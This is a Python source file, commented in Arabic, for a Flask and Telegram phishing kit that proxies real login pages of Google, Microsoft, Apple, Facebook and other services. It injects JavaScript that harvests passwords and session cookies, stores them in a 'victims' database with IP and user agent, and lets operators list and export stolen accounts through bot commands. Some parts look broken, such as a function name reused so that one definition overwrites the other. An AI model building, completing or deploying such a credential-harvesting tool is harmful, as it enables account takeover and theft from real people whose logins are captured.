#!/usr/bin/env python3
# ============================================================
# بوت تصيد متقدم - نسخة Webhook (تعمل على Render)
# ============================================================

import os
import json
import sqlite3
import secrets
import requests
from datetime import datetime
from flask import Flask, request, jsonify, redirect, make_response
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, ContextTypes, Dispatcher

# ========== الإعدادات ==========
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_IDS = [int(id.strip()) for id in os.environ.get("ADMIN_IDS", "").split(",") if id.strip()]
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")

if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN not set")

# ========== Flask ==========
app = Flask(__name__)

# ========== قاعدة البيانات ==========
DB_PATH = "sessions.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT UNIQUE,
        target TEXT,
        email TEXT,
        password TEXT,
        cookies TEXT,
        ip TEXT,
        user_agent TEXT,
        timestamp TEXT,
        status TEXT DEFAULT 'new'
    )''')
    conn.commit()
    conn.close()

def save_victim(session_id, target, email, password, cookies, ip, ua):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO victims 
                 (session_id, target, email, password, cookies, ip, user_agent, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (session_id, target, email, password, json.dumps(cookies), ip, ua, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_all_victims():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, session_id, target, email, timestamp, status FROM victims ORDER BY id DESC")
    data = c.fetchall()
    conn.close()
    return data

def get_victim_by_id(vid):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT cookies, email, password, target FROM victims WHERE id = ?", (vid,))
    data = c.fetchone()
    conn.close()
    return data

def delete_victim(vid):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM victims WHERE id = ?", (vid,))
    conn.commit()
    conn.close()

def mark_as_viewed(vid):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE victims SET status = 'viewed' WHERE id = ?", (vid,))
    conn.commit()
    conn.close()

# ========== دوال البوت ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ غير مصرح لك.")
        return
    await update.message.reply_text(
        "🔥 **بوت التصيد المتقدم v3.0 (Webhook)**\n\n"
        "**الأوامر:**\n"
        "/phish <الهدف> - إنشاء رابط تصيد\n"
        "/list - عرض الضحايا\n"
        "/view <id> - عرض الكوكيز\n"
        "/export <id> - تصدير الكوكيز\n"
        "/delete <id> - حذف ضحية\n"
        "/stats - إحصائيات",
        parse_mode='Markdown'
    )

async def phish(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if not context.args:
        await update.message.reply_text("❌ استخدم: /phish <الهدف>\nمثال: `/phish google`")
        return
    target = context.args[0].lower()
    session_id = f"{target}_{secrets.token_urlsafe(6)}"
    link = f"{BASE_URL}/phish/{session_id}"
    await update.message.reply_text(
        f"🔗 **رابط تصيد جديد**\n\n"
        f"🎯 **الهدف:** `{target}`\n"
        f"🆔 **الجلسة:** `{session_id}`\n"
        f"🔗 **الرابط:** {link}",
        parse_mode='Markdown'
    )

async def list_victims(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    victims = get_all_victims()
    if not victims:
        await update.message.reply_text("📭 لا يوجد ضحايا.")
        return
    msg = "📋 **الضحايا:**\n\n"
    for v in victims:
        status_icon = "🟢" if v[5] == 'new' else "🔵"
        msg += f"{status_icon} `{v[0]}` | 🎯 {v[2]} | 📧 {v[3] if v[3] else 'غير معروف'} | 📅 {v[4]}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def view_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if not context.args:
        await update.message.reply_text("❌ استخدم: /view <id>")
        return
    vid = int(context.args[0])
    data = get_victim_by_id(vid)
    if not data:
        await update.message.reply_text("❌ الضحية غير موجودة.")
        return
    cookies, email, password, target = data
    mark_as_viewed(vid)
    cookies_data = json.loads(cookies)
    msg = (
        f"🍪 **كوكيز الضحية #{vid}**\n\n"
        f"🎯 **الهدف:** {target}\n"
        f"📧 **البريد:** {email if email else 'غير موجود'}\n"
        f"🔑 **كلمة المرور:** {password if password else 'غير موجود'}\n"
        f"🍪 **عدد الكوكيز:** {len(cookies_data)}\n\n"
        f"**عينة من الكوكيز:**\n"
        f"```json\n{json.dumps(list(cookies_data.items())[:5], indent=2)}\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def export_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if not context.args:
        await update.message.reply_text("❌ استخدم: /export <id>")
        return
    vid = int(context.args[0])
    data = get_victim_by_id(vid)
    if not data:
        await update.message.reply_text("❌ غير موجود.")
        return
    cookies, email, password, target = data
    cookies_data = json.loads(cookies)
    export = {
        "id": vid,
        "target": target,
        "email": email,
        "password": password,
        "cookies": cookies_data,
        "exported_at": datetime.now().isoformat()
    }
    filename = f"victim_{vid}.json"
    with open(filename, "w") as f:
        json.dump(export, f, indent=2)
    await update.message.reply_document(
        document=open(filename, "rb"),
        caption=f"📦 بيانات الضحية #{vid}"
    )
    os.remove(filename)

async def delete_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if not context.args:
        await update.message.reply_text("❌ استخدم: /delete <id>")
        return
    vid = int(context.args[0])
    delete_victim(vid)
    await update.message.reply_text(f"✅ تم حذف الضحية #{vid}.")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    victims = get_all_victims()
    total = len(victims)
    viewed = len([v for v in victims if v[5] == 'viewed'])
    new = total - viewed
    targets = {}
    for v in victims:
        target = v[2]
        targets[target] = targets.get(target, 0) + 1
    target_stats = "\n".join([f"   🎯 {t}: {c}" for t, c in targets.items()])
    await update.message.reply_text(
        f"📊 **إحصائيات**\n\n"
        f"👤 **إجمالي الضحايا:** `{total}`\n"
        f"🆕 **جدد:** `{new}`\n"
        f"👁️ **تم عرضها:** `{viewed}`\n\n"
        f"**الخدمات المستهدفة:**\n{target_stats if target_stats else 'لا يوجد بيانات'}",
        parse_mode='Markdown'
    )

# ========== مسار Webhook ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    """استقبال التحديثات من تيليجرام"""
    try:
        data = request.get_json()
        if not data:
            return "No data", 400
        
        # إنشاء Update من البيانات
        update = Update.de_json(data, bot)
        
        # معالجة التحديث باستخدام Dispatcher
        dispatcher.process_update(update)
        
        return "OK", 200
    except Exception as e:
        print(f"Error: {e}")
        return "Error", 500

@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    """تعيين Webhook يدوياً"""
    webhook_url = f"{BASE_URL}/webhook"
    response = bot.set_webhook(url=webhook_url)
    if response:
        return f"✅ Webhook set to {webhook_url}"
    return "❌ Failed to set webhook"

@app.route('/')
def home():
    return "🚀 Phishing Proxy Server is running!"

@app.route('/health')
def health():
    return "OK", 200

# ========== خادم التصيد ==========
@app.route('/phish/<session_id>', methods=['GET', 'POST'])
def phish_page(session_id):
    target = session_id.split('_')[0] if '_' in session_id else 'google'
    
    targets = {
        'google': 'https://accounts.google.com',
        'facebook': 'https://www.facebook.com',
        'microsoft': 'https://login.microsoftonline.com',
        'apple': 'https://appleid.apple.com',
        'github': 'https://github.com',
        'twitter': 'https://twitter.com',
        'instagram': 'https://www.instagram.com',
        'linkedin': 'https://www.linkedin.com',
        'amazon': 'https://www.amazon.com'
    }
    real_url = targets.get(target, 'https://accounts.google.com')
    
    if request.method == 'POST':
        email = request.form.get('email') or request.form.get('username') or request.form.get('login') or ''
        password = request.form.get('password') or request.form.get('pass') or ''
        cookies = {k: v for k, v in request.cookies.items()}
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        save_victim(session_id, target, email, password, cookies, ip, ua)
        
        # إشعار للبوت
        try:
            msg = f"🔴 **اختراق جديد!**\n\n🎯 **الهدف:** `{target}`\n📧 **البريد:** `{email}`\n🔑 **كلمة المرور:** `{password}`\n🍪 **الكوكيز:** {len(cookies)} كوكي"
            for admin_id in ADMIN_IDS:
                bot.send_message(chat_id=admin_id, text=msg, parse_mode='Markdown')
        except:
            pass
        
        return redirect(real_url)
    
    # GET: عرض الموقع الأصلي
    try:
        response = requests.get(real_url, headers={'User-Agent': request.headers.get('User-Agent', '')})
        html = response.text
        
        inject_script = f"""
        <script>
        (function() {{
            let cookies = document.cookie.split(';').reduce((o, c) => {{
                let [k, v] = c.trim().split('=');
                o[k] = v;
                return o;
            }}, {{}});
            
            let originalSubmit = HTMLFormElement.prototype.submit;
            HTMLFormElement.prototype.submit = function() {{
                let form = this;
                let formData = new FormData(form);
                let data = {{}};
                for (let [k, v] of formData) data[k] = v;
                
                fetch('/collect', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: '{session_id}',
                        email: data.email || data.username || '',
                        password: data.password || '',
                        cookies: cookies
                    }})
                }});
                originalSubmit.call(form);
            }};
        }})();
        </script>
        """
        
        html = html.replace('</body>', inject_script + '</body>')
        return make_response(html)
    except:
        return redirect('https://accounts.google.com')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    session_id = data.get('session_id')
    email = data.get('email', '')
    password = data.get('password', '')
    cookies = data.get('cookies', {})
    
    if session_id:
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        target = session_id.split('_')[0] if '_' in session_id else 'unknown'
        save_victim(session_id, target, email, password, cookies, ip, ua)
        
        try:
            msg = f"🆕 **بيانات جديدة عبر JS!**\n🎯 الهدف: {target}\n📧 {email if email else 'غير موجود'}\n🍪 {len(cookies)} كوكي"
            for admin_id in ADMIN_IDS:
                bot.send_message(chat_id=admin_id, text=msg, parse_mode='Markdown')
        except:
            pass
    
    return jsonify({"status": "ok"}), 200

# ========== تشغيل التطبيق ==========
if __name__ == "__main__":
    init_db()
    
    # إنشاء Bot و Dispatcher
    bot = Bot(token=TELEGRAM_TOKEN)
    dispatcher = Dispatcher(bot, None)
    
    # تسجيل الأوامر
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("phish", phish))
    dispatcher.add_handler(CommandHandler("list", list_victims))
    dispatcher.add_handler(CommandHandler("view", view_victim))
    dispatcher.add_handler(CommandHandler("export", export_victim))
    dispatcher.add_handler(CommandHandler("delete", delete_victim))
    dispatcher.add_handler(CommandHandler("stats", stats))
    
    # تشغيل Flask
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
